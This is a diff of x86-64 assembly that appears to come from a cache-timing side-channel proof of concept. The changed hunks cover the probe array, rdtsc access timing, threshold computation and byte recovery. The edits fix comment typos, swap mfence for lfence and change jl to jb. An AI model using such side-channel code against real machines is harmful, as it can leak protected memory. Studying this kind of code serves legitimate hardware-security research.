@@ -55,7 +55,7 @@ _start:
 ; this is needed because an empty probe array leads to unreliable cache timing 
     mov   RAX,page_size
     mov   RBX,256
-    mul   RBX                 ; the number f bytes the probe array has
+    mul   RBX                 ; the number of bytes the probe array has
     mov   RCX,RAX
     mov   RDI,probe           ; move address of probe array to RDI
     call  random_fill
@@ -298,14 +298,14 @@ determine_cache_times:
 next_analyse:
     mov   R8,RBX
     shl   R8,CL               ; multiply with the page size
-    mfence
+    lfence
     rdtsc                     ; get the time stamp counter
     mov   R9b,[RSI+R8]
     shl   RDX,32              ; mov EDX to the high double word
     add   RAX,RDX             ; add it to the low double word
     mov   R15,RAX
 
-    mfence
+    lfence
     rdtsc                     ; get the time stamp counter
     shl   RDX,32              ; mov EDX to the high double word
     add   RAX,RDX             ; add it to the low double word
@@ -378,7 +378,7 @@ get_probable_value:
 
     call  analyse_access
     add   R15,R14
-    shr   R15,1                         ; R15 now contains the threashold value
+    shr   R15,1                         ; R15 now contains the threshold value
     mov   RSI,R12
     xor   RCX,RCX
 next_prob_value:
@@ -393,7 +393,7 @@ multiple_values:
 not_value:
     inc   RCX
     cmp   RCX,256
-    jl    next_prob_value
+    jb    next_prob_value
 
     pop   R15
     pop   R14
